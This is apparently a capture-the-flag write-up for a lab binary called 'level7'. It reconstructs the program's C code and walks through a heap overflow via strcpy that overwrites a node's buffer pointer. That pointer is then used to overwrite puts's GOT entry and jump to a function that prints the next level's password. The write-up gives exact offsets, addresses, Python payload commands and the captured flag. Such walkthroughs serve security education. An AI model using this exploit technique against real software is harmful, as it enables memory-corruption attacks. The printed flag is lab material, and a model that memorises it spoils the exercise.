# level7

Analyzing the code, we see that the program allocates two node structures.

Here is the reconstructed C code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

char c[80];

struct Node {
    int id;
    char *buf;
};

void m(void) {
    time_t tVar1 = time(NULL);
    printf("%s - %ld\n", c, tVar1);
}

int main(int argc, char *argv[]) {
    struct Node *node1;
    struct Node *node2;
    FILE *stream;

    node1 = (struct Node *)malloc(sizeof(struct Node));
    node1->id = 1;
    node1->buf = (char *)malloc(8);

    node2 = (struct Node *)malloc(sizeof(struct Node));
    node2->id = 2;
    node2->buf = (char *)malloc(8);

    if (argc > 2) {
        strcpy(node1->buf, argv[1]);
        strcpy(node2->buf, argv[2]);
    }

    stream = fopen("/home/user/level8/.pass", "r");
    if (stream != NULL) {
        fgets(c, 0x44, stream);
        fclose(stream);
    }

    puts("~~");
    return 0;
}
```

The program allocates memory for each `Node` struct, which in turn allocates an 8-byte buffer.

The heap layout looks like this:
```text
[metadata n1] + [user data n1] + [metadata n1buf] + [user data n1buf] + [metadata n2] + [user data n2] + [metadata n2buf] + [user data n2buf]
```
In terms of sizes:
```text
8 + sizeof(node) + 8 + 8(buffer) + 8 + sizeof(node) + 8 + 8(buffer)
```

Here, we exploit the vulnerability by using `argv[1]` to overflow `node1->buf` and `argv[2]` to write the target address.

### Exploitation Strategy

The only function called after the buffer copies is `puts("~~")`. We can use the GOT overwrite technique to hijack this call.

Disassembling `puts@plt` in GDB:
```text
(gdb) disassemble puts
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:	jmp    DWORD PTR ds:0x8049928
   0x08048406 <+6>:	push   0x28
   0x0804840b <+11>:	jmp    0x80483a0
End of assembler dump.
```
The GOT address of `puts` is `0x08049928`.

`strcpy` writes content directly to the address pointed to by the destination parameter. In this case, `node1->buf` and `node2->buf` are heap pointers.

We can use the first `strcpy` (with `argv[1]`) to overflow past `node1->buf` and overwrite the `node2->buf` pointer stored inside the `node2` struct. This way, when the second `strcpy` runs, it will copy `argv[2]` into whatever address we wrote into `node2->buf`—which will be `puts`'s GOT entry address.

### Offset Calculation

In memory, each `Node` structure is laid out as:
```text
[id (4 bytes)] [buf pointer (4 bytes)]
```

Since our input writes starting at `node1->buf`, we need to overwrite the following bytes to reach the `node2->buf` pointer:
- `8` bytes of `node1->buf` user data.
- `8` bytes of `node2` chunk metadata.
- `4` bytes of `node2->id`.
Total padding = `8 + 8 + 4 = 20` bytes.

So, payload1 (`argv[1]`) will contain:
`8 (buffer padding) + 8 (metadata padding) + 4 (id padding) + GOT address`

Using `[::-1]` to reverse the target GOT address of `puts` (`0x08049928`), we build payload1:
```bash
python -c 'print "B" * 8 + "M" * 8 + "I" * 4 + "\x08\x04\x99\x28"[::-1]' > payload1
```

For the second argument `argv[2]`, we want to write the address of our target function `m`.
Using GDB:
```text
(gdb) info functions m
Non-debugging symbols:
...
0x080484f4  m
...
```
The address of `m` is `0x080484f4`.

Using `[::-1]` to reverse `m`'s address, we build payload2:
```bash
python -c 'print "\x08\x04\x84\xf4"[::-1]' > payload2
```

### Execution

We run the exploit passing the two payloads:
```bash
./level7 $(cat payload1) $(cat payload2)
```

This overwrites `puts`'s GOT entry with `m`'s address. When `puts("~~")` is called, it redirects to `m`, printing the flag for `level8`:
```
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```
